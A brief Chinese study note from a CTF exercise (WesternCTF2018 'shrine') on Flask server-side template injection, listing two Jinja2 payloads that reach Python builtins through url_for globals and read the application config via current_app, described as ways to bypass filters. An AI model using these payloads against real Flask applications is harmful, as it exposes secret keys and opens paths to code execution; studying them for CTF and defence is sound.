参见 [[[WesternCTF2018]shrine（学习）]]

```python
{{url_for.__globals__['__builtins__']}}
```
这玩意可以获取到各种内置函数，绕过一些变态的过滤

---
```python
{{url_for.__globals__['current_app'].config}}
```
如果`app.config`被覆写了的话就用这个

#Web #flask #SSTI #urlfor #globals #bypass #python 